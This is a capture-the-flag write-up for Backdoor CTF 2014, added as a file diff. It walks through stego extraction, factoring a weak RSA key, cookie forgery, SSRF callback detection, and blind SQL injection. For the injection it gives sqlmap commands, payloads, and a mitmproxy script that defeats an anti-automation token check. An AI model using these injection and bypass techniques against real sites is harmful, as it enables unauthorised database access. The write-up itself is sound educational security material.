@@ -1,0 +1,309 @@
+<p><link rel='stylesheet' href='markdown8.css'/></p>
+
+<h1>Backdoor CTF 2014 Writeups</h1>
+
+<p>With reasonable brevity by SIGINT </p>
+
+<p><a id="crypto10"></a></p>
+
+<h2>Crypto 10</h2>
+
+<pre><code>[andrew@archa backdoor]$ binwalk -e crypto10.jpg 
+
+DECIMAL  HEX      DESCRIPTION
+-----------------------------------------------------------
+0        0x0      JPEG image data, JFIF standard  1.01
+40804    0x9F64   Zip archive data, name: "got2.jpg"  
+73941    0x120D5  End of Zip archive
+
+[andrew@archa _crypto10.jpg.extracted]$ binwalk -e got2.jpg 
+
+DECIMAL  HEX     DESCRIPTION
+-----------------------------------------------------------
+0        0x0     JPEG image data, JFIF standard  1.02
+33587    0x8333  Zip archive data, name: "txt.txt"  
+33761    0x83E1  End of Zip archive
+
+[andrew@archa _got2.jpg.extracted]$ cat txt.txt 
+6307834008eb8edbe18c7a20ee4a909d
+</code></pre>
+
+<p><a id="crypto100"></a></p>
+
+<h2>Crypto 100</h2>
+
+<pre><code>[andrew@archa backdoor]$ hexdump -C ciphertext.txt 
+00000000  0c 08 d1 e9 22 a6 12 49  20 45 73 2b 00 a5 46 40  |...."..I Es+..F@|
+00000010  cb 25 2e 2e 84 f0 75 8a  f3 87 d6 0c              |.%....u.....|
+0000001c
+
+[andrew@archa backdoor]$ openssl rsa -in id.pub -pubin -text    
+Public-Key: (220 bit)
+Modulus:
+    0c:09:e7:ec:78:f2:f8:ad:a9:95:34:48:22:64:77:
+    28:1b:09:9d:18:35:70:2b:4d:e5:07:5d:6b
+Exponent: 65537 (0x10001)
+writing RSA key
+-----BEGIN PUBLIC KEY-----
+MDcwDQYJKoZIhvcNAQEBBQADJgAwIwIcDAnn7Hjy+K2plTRIImR3KBsJnRg1cCtN
+5QddawIDAQAB
+-----END PUBLIC KEY-----
+</code></pre>
+
+<p><a href="http://en.wikipedia.org/wiki/RSA_Factoring_Challenge">This page</a> shows that factoring a 330-bit key was possible in 1991. Absent any other weaknesses, it seems that all we have to do is factor the modulus of the public key. Here I use CADO-NFS to factor the modulus.</p>
+
+<pre><code>&gt;&gt;&gt; int('0c:09:e7:ec:78:f2:f8:ad:a9:95:34:48:22: \
+... 64:77:28:1b:09:9d:18:35:70:2b:4d:e5:07:5d:6b'.replace(':',''),16)          
+1267822572326555807122159576684530178338449545988069238646937967979L
+
+[andrew@archa backdoor]$ /usr/libexec/cado-nfs/bin/factor.sh 1267822572326555807122159576684530178338449545988069238646937967979 
+&lt; math omitted &gt;
+Info:Complete Factorization: Total cpu/real time for everything: 230.48/248.437
+1162435056374824133712043309728653 1090660992520643446103273789680343
+OK
+</code></pre>
+
+<p>I have a local script to generate an RSA private key file from provided p and q values, but it's possible to use an online generator if you are less paranoid.</p>
+
+<pre><code>[andrew@archa backdoor]$ wget "http://rose.makesad.us/~schoen/cgi-bin/private-from-pq.cgi?1162435056374824133712043309728653&amp;1090660992520643446103273789680343" -O id.pem
+[andrew@archa backdoor]$ openssl rsautl -decrypt -inkey id.pem &lt; ciphertext.txt 
+random_prime_gen
+</code></pre>
+
+<p><a id="web10"></a></p>
+
+<h2>Web 10</h2>
+
+<pre><code>[andrew@archa ~]$ curl -v http://backdoor.cognizance.org.in/problems/web10/
+* Hostname was NOT found in DNS cache
+*   Trying 128.199.215.224...
+* Connected to backdoor.cognizance.org.in (128.199.215.224) port 80 (#0)
+&gt; GET /problems/web10/ HTTP/1.1
+&gt; User-Agent: curl/7.35.0
+&gt; Host: backdoor.cognizance.org.in
+&gt; Accept: */*
+&gt; 
+&lt; HTTP/1.1 200 OK
+&lt; Date: Sun, 23 Mar 2014 01:46:06 GMT
+* Server Apache/2.2.22 (Ubuntu) is not blacklisted
+&lt; Server: Apache/2.2.22 (Ubuntu)
+&lt; X-Powered-By: PHP/5.3.10-1ubuntu3.10
+&lt; Backdoor-CTF: 28b3324be8b003ee7e1d0d153fad3c32
+&lt; Vary: Accept-Encoding
+&lt; Content-Length: 2716
+&lt; Content-Type: text/html
+&lt;
+</code></pre>
+
+<p>Do you spot the flag?</p>
+
+<p><a id="web30"></a></p>
+
+<h2>Web 30</h2>
+
+<pre><code>[andrew@archa ~]$ curl http://backdoor.cognizance.org.in/problems/web30/ -D - -o /dev/null 
+Date: Sun, 23 Mar 2014 02:05:23 GMT
+Server: Apache/2.2.22 (Ubuntu)
+X-Powered-By: PHP/5.3.10-1ubuntu3.10
+Set-Cookie: auth=false
+Vary: Accept-Encoding
+Content-Length: 2683
+Content-Type: text/html
+</code></pre>
+
+<p>That's an interesting cookie.</p>
+
+<pre><code>[andrew@archa ~]$ curl http://backdoor.cognizance.org.in/problems/web30/auth.php?                   
+Sorry , you will never get a flag in your life :P  Not authorized
+</code></pre>
+
+<p>What if we send <code>auth=true</code>?</p>
+
+<pre><code>[andrew@archa ~]$ curl http://backdoor.cognizance.org.in/problems/web30/auth.php? --cookie "auth=true"
+Here is a flag : aeba37a3aaffc93567a61d9a67466fdf
+</code></pre>
+
+<p><a id="web50"></a></p>
+
+<h2>Web 50</h2>
+
+<p>The PHP script appears to be running a SQL query of the form <code>SELECT FROM QUOTES WHERE quote LIKE '$search';</code></p>
+
+<p>We can make this conditional true for all quotes by searching for <code>' or 1=1 or '</code>. We can check whether a SQL conditional evaluates to true by ANDing the conditional with another that should return true, e.g. <code>f' and 2=2 or 'foobar'='</code>. This allows us to extract one bit of information per query. We could write a binary search script to extract characters to read the database and, hopefully, the flag. </p>
+
+<p>sqlmap is a great tool for automatic exploitation of SQL injection vulnerabilities. Let's throw sqlmap at the page for a few minutes to find all of the tables.</p>
+
+<pre><code>sqlmap -u http://backdoor.cognizance.org.in/problems/web50/search.php --data="search=f" --tables --threads 10 --exclude-sysdbs
+
+---
+Place: POST
+Parameter: search
+    Type: boolean-based blind
+Title: AND boolean-based blind - WHERE or HAVING clause
+Payload: search=f%' AND 5266=5266 AND '%'='
+
+Type: AND/OR time-based blind
+Title: MySQL &gt; 5.0.11 AND time-based blind
+    Payload: search=f%' AND SLEEP(5) AND '%'='
+---
+
+Database: sqli_db
+[2 tables]
++-----------------------+
+| quotes                |
+| the_flag_is_over_here |
++-----------------------+
+</code></pre>
+
+<p>Hmm, let's take them at their word and dump the contents of that second table:</p>
+
+<pre><code>sqlmap -u http://backdoor.cognizance.org.in/problems/web50/search.php --data="search=f" -D sqli_db -T the_flag_is_over_here --dump  --threads 10 --exclude-sysdbs
+
+Database: sqli_db
+Table: the_flag_is_over_here
+[1 entry]
++----------------------------------+
+| twisted_column_name              |
++----------------------------------+
+| d5abaf391f7bc7e7cda8c128e5ca3187 |
++----------------------------------+
+</code></pre>
+
+<p><a id="web100-1"></a></p>
+
+<h2>Web 100-1</h2>
+
+<p>The server has to retrieve the picture in order to rate it, right? Does it do anything else? Let's listen on port 80 on any server:</p>
+
+<pre><code>sudo nc -vlp 80
+</code></pre>
+
+<p>Then submit a link to your machine e.g. <code>http://my.box.fqdn.com/</code></p>
+
+<pre><code> Connection from 128.199.215.224:39533
+ GET / HTTP/1.1
+ Host: my.box.fqdn.com
+ Accept: */*
+ X-Referrer: 92702a9381515494689f5d14f85a83b7.php
+</code></pre>
+
+<p>That referrer URL isn't the flag, so see what's on the page:</p>
+
+<pre><code> [andrew@archa ~]$ curl http://backdoor.cognizance.org.in/problems/web100-1/92702a9381515494689f5d14f85a83b7.php
+ &lt;!doctype html&gt;
+ &lt;html&gt;
+ &lt;head&gt;
+   &lt;title&gt;Super Secret Page&lt;/title&gt;
+   &lt;/head&gt;
+   &lt;body&gt;
+     &lt;h2&gt;Super secret page&lt;/h2&gt;
+ &lt;p&gt;This is a dangerous place. You shouldn't be lurking here. Click &lt;a id="./submit.php"&gt;here&lt;/a&gt; to go back.&lt;/p&gt;
+ &lt;!-- By the way, the flag is f556b9a48a3ee914f291f9b98645cb02 --&gt;
+   &lt;/body&gt;
+ &lt;/html&gt;
+</code></pre>
+
+<p><a id="web300"></a></p>
+
+<h2>Web 300</h2>
+
+<p>This problem gives you an interface to check whether a user has registered <a href="http://backdoor.cognizance.org.in/problems/web300/status.php">here</a>. </p>
+
+<p>If the username does not exist, the script returns <code>Please wait for a little while for this user to be validated</code>.
+If it does exist, it returns <code>This user has been validated</code>.</p>
+
+<p>As before, this script is vulnerable to blind SQL injection, and we receive a single bit of information from each query. </p>
+
+<p>However, once we try to use sqlmap to exploit this automatically, we find that it cannot automatically detect and exploit the vulnerability. Rerunning sqlmap with the <code>-v 6</code> option will show full requests and responses. We see that the check.php script is now returning <code>No automated tools please :)</code>. How does it detect this?</p>
+
+<p>For one, sqlmap usually sends a user-agent that identifies its requests as originating from sqlmap. However, copying the user-agent from Chrome does not solve the problem.</p>
+
+<p>Taking a closer look at how a browser interacts with the problem, we find that the status.php page sets a cookie named <code>web_300_token</code> and the check.php page deletes this cookie. Each time the status.php page is loaded, we get a new <code>web_300_token</code>. The response headers of that page are clearly designed to prevent the browser from even thinking about caching anything from that page:</p>
+
+<pre><code>Cache-Control:no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Date:Sun, 23 Mar 2014 03:49:14 GMT
+Expires:Thu, 19 Nov 1981 08:52:00 GMT
+Pragma:no-cache
+</code></pre>
+
+<p>When you try to use the same <code>web_300_token</code> to send a second request to check.php, the server returns the <code>No automated tools please :)</code> message. So, we need to make sure that each request from sqlmap has a valid <code>web_300_token</code>, by making a request to status.php before each query.</p>
+
+<p>Unfortunately, sqlmap can't do this out of the box. sqlmap <em>does</em> provide an <code>--eval</code> flag which executes Python code in a context containing the data that sqlmap is about to send, along with cookies. However, though it supports modification/addition of query data, changes to cookies are not reflected in the outgoing request. </p>
+
+<p>Our first idea was a bit complicated. We put sqlmap behind an instance of mitmproxy with sticky cookies enabled on all requests. Then, in sqlmap's <code>--eval</code> parameter we passed the code:</p>
+
+<pre><code>import urllib,time; urllib.urlopen('http://backdoor.cognizance.org.in/problems/web300/status.php',proxies={'http':'http://127.0.0.1:7222'});
+</code></pre>
+
+<p>The intention was that before each request, sqlmap should send a front-running request to status.php to prime the proxy with the <code>web_300_token</code> cookie. Then sqlmap would send the primary request, mitmproxy would tack on the cookie it received from status.php, and the query would be processed as if from a browser. </p>
+
+<p>For some reason, this doesn't work as intended - mitmproxy mangles and combines cookies with expiration times on outgoing requests, and the check.php script rejects them. So, we had to go a step further and put together a libmproxy server to process the incoming and outgoing requests as we wanted:</p>
+
+<pre><code>from libmproxy import controller, proxy
+import os
+
+class StickyMaster(controller.Master):
+    def __init__(self, server):
+        controller.Master.__init__(self, server)
+        self.cookies=[]
+    def run(self):
+        try:
+            return controller.Master.run(self)
+        except KeyboardInterrupt:
+            self.shutdown()
+
+    def handle_request(self, msg):
+        hid = (msg.host, msg.port)
+        msg.headers["Cookie"] = ['; '.join(self.cookies)]
+        msg.headers['User-Agent'] = ['Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.152 Safari/537.36']
+        msg.headers['Connection'] = ['keep-alive']
+        msg.reply()
+
+    def handle_response(self, msg):
+        hid = (msg.request.host, msg.request.port)
+        if msg.headers["set-cookie"]:
+            self.cookies = [x.split(';')[0] for x in msg.headers["set-cookie"] if 'delete' not in x]            
+        print msg.headers, self.cookies
+        msg.reply()
+config = proxy.ProxyConfig()
+server = proxy.ProxyServer(config, 7222)
+m = StickyMaster(server)
+m.run()
+</code></pre>
+
+<p>(We had further issues with the user-agent, so we also set the user-agent at the proxy to resolve them)</p>
+
+<p>This nearly worked, but we noticed that it was rejecting most of our requests. We suspected that check.php was rejecting <code>web_300_tokens</code> which were too new. Experimentally, we determined that tokens newer than 2 seconds old were not valid, so to be safe, we inserted a 5-second sleep in our <code>--eval</code> code after priming the proxy.</p>
+
+<p>Finally, sqlmap was able to work its magic and probe the database, albeit with requests spaced by around 5 seconds. Using a single proxy also meant that we could not use multiple sqlmap threads, although if desired we could have fixed that by including a complicated token queue in the proxy.</p>
+
+<pre><code>---
+Place: POST
+Parameter: username
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: username=asdf' AND 7617=7617 AND 'SRYh'='SRYh
+    Vector: AND [INFERENCE]
+---
+</code></pre>
+
+<p>Listing tables as before showed that there is a table named <code>the_elusive_flag</code> containing a single row.</p>
+
+<pre><code>sqlmap -u http://backdoor.cognizance.org.in/problems/web300/check.php \
+   --data="username=asdf" --proxy=http://127.0.0.1:7222 \
+   --eval="import urllib,time; urllib.urlopen('http://backdoor.cognizance.org.in/problems/web300/status.php', \
+           proxies={'http':'http://127.0.0.1:7222'}); time.sleep(5)" \
+   --threads=1 -v 6 --dbms=mysql -T the_elusive_flag --dump -D blind_sqli_db
+</code></pre>
+
+<p>In the column named <code>this_column_has_the_flag</code> of the single row, we find, against all odds, a flag!</p>
+
+<pre><code>Database: blind_sqli_db
+Table: the_elusive_flag
+[1 entry]
++----------------------------------+
+| this_column_has_the_flag         |
++----------------------------------+
+| 9d4dcc5981b17bf37740c7dbabe3b294 |
++----------------------------------+
+</code></pre>
